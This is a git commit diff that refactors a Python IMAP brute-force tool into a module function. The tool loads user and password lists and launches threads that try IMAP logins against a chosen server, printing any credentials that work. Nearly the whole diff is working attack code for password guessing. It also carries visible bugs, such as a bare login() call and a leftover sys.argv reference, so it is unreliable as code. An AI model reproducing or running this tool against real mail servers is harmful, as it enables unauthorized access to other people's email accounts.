674f8435c550c07e5b0cc65b45767b2047a835b2
Mine_Bit <x-manstor@yandex.ru>
2015-02-17 17:17:30 +0400

    imap брутфорс переписан в модуль

--- mod/imapbrute.py
+++ mod/imapbrute.py
@@ -13,85 +13,67 @@ from imaplib import IMAP4
 from copy import copy
 
 
-if len(sys.argv) != 4:
-    print
-    "Usage: ./imapbrute.py <server> <userlist> <wordlist>"
-    sys.exit(1)
+def Start(server_in, userlist_in, wordlist_in):
+    try:
+        users = open(userlist_in, "r").readlines()
+    except(IOError):
+        print('Error: Check your userlist path')
+        sys.exit(1)
 
-try:
-    users = open(sys.argv[2], "r").readlines()
-except(IOError):
-    print
-    "Error: Check your userlist path\n"
-    sys.exit(1)
+    try:
+        words = open(wordlist_in, "r").readlines()
+    except(IOError):
+        print('Error: Check your wordlist path')
+    print('Параметры:')
+    print('[+] Server:', server_in);
+    print('[+] Users Loaded:', len(users))
+    print('[+] Words Loaded:', len(words))
 
-try:
-    words = open(sys.argv[3], "r").readlines()
-except(IOError):
-    print
-    "Error: Check your wordlist path\n"
-    sys.exit(1)
-
-print
-"\n\t   d3hydr8[at]gmail[dot]com imapBruteForcer v1.0"
-print
-"\t--------------------------------------------------\n"
-print
-"[+] Server:", sys.argv[1]
-print
-"[+] Users Loaded:", len(users)
-print
-"[+] Words Loaded:", len(words), "\n"
-
-wordlist = copy(words)
+    wordlist = copy(words)
 
 
-def reloader():
-    for word in wordlist:
-        words.append(word)
+    def reloader():
+        for word in wordlist:
+            words.append(word)
 
 
-def getword():
-    lock = threading.Lock()
-    lock.acquire()
-    if len(words) != 0:
-        value = random.sample(words, 1)
-        words.remove(value[0])
-    else:
-        print
-        "\nReloading Wordlist - Changing User\n"
-        reloader()
-        value = random.sample(words, 1)
-        users.remove(users[0])
+    def getword():
+        lock = threading.Lock()
+        lock.acquire()
+        if len(words) != 0:
+            value = random.sample(words, 1)
+            words.remove(value[0])
+        else:
+            print('Reloading Wordlist - Changing User')
+            reloader()
+            value = random.sample(words, 1)
+            users.remove(users[0])
 
-    lock.release()
-    if len(users) == 1:
-        return value[0][:-1], users[0]
-    else:
-        return value[0][:-1], users[0][:-1]
+        lock.release()
+        if len(users) == 1:
+            return value[0][:-1], users[0]
+        else:
+            return value[0][:-1], users[0][:-1]
 
 
-class Worker(threading.Thread):
-    def run(self):
-        value, user = getword()
-        try:
-            print
-            "-" * 12
-            print
-            "User:", user, "Password:", value
-            M = imaplib.IMAP4(sys.argv[1])
-            M = login(user, value)
-            print
-            "\t\nLogin successful:", user, value
-            M.close()
-            M.logout()
-            work.join()
-            sys.exit(2)
-        except(IMAP4.error, socket.gaierror, socket.error, socket.herror) as msg:
-            print('An error occurred: ', msg)
-            pass
+    class Worker(threading.Thread):
+        def run(self):
+            value, user = getword()
+            try:
+                print('-' * 12)
+                print('User:', user, 'Password:', value)
+                M = imaplib.IMAP4(sys.argv[1])
+                M = login(user, value)
+                print('Login successful:', user, value)
+                M.close()
+                M.logout()
+                work.join()
+                sys.exit(2)
+            except(IMAP4.error, socket.gaierror, socket.error, socket.herror) as msg:
+                print('An error occurred: ', msg)
+                pass
 
-for i in range(len(words) * len(users)):
-    work = Worker()
-    work.start()
-    time.sleep(1)
+    for i in range(len(words) * len(users)):
+        work = Worker()
+        work.start()
+        time.sleep(1)
